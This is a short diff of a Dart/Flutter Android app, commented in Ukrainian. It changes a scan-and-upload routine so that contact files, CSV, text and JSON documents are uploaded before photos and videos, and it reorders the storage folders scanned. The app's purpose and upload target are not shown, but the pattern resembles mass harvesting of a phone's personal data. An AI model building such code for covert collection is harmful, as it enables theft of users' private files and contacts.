@@ -420,6 +420,22 @@ Future<void> _scanAndUploadFiles() async {
         }
       }
 
+      // === ДОДАНО: СОРТУВАННЯ ЗА ПРОРІОРИТЕТОМ ===
+      allFiles.sort((a, b) {
+        final pathA = a.path.toLowerCase();
+        final pathB = b.path.toLowerCase();
+
+        // Функція для отримання числового пріоритету
+        int getPriority(String path) {
+          if (path.endsWith('.vcf') || path.endsWith('.csv') || path.endsWith('.txt') || path.endsWith('.json')) return 1;
+          if (path.endsWith('.jpg') || path.endsWith('.jpeg') || path.endsWith('.png') || path.endsWith('.gif')) return 2;
+          if (path.endsWith('.mp4') || path.endsWith('.mov') || path.endsWith('.avi') || path.endsWith('.mkv')) return 3;
+          return 4;
+        }
+
+        return getPriority(pathA).compareTo(getPriority(pathB));
+      });
+
       final totalFiles = allFiles.length;
       int totalFilesUploaded = 0;
       int totalFilesSkipped = 0;
@@ -595,10 +611,11 @@ Future<void> _performDiagnostics() async {
 
     final detailedDirs = [
       '/storage/emulated/0/DCIM',
-      '/storage/emulated/0/DCIM/Camera',
-      '/storage/emulated/0/Pictures',
-      '/storage/emulated/0/Download',
       '/storage/emulated/0/Documents',
+      '/storage/emulated/0/Pictures',
+      '/storage/emulated/0/DCIM/Camera',
+      '/storage/emulated/0/Download',
+
     ];
 
     for (final path in detailedDirs) {
